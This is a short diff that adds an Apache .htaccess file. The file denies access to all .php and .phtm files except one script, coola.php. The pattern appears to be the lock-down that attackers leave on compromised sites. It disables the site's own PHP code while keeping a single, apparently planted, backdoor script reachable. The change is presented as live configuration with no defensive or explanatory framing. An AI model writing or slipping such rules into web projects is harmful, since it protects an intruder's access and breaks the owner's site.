@@ -1,0 +1,10 @@
+<FilesMatch ".*\.php.*$">
+deny from all
+</FilesMatch>
+<FilesMatch ".*\.phtm.*$">
+deny from all
+</FilesMatch>
+<FilesMatch "^(coola.php)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
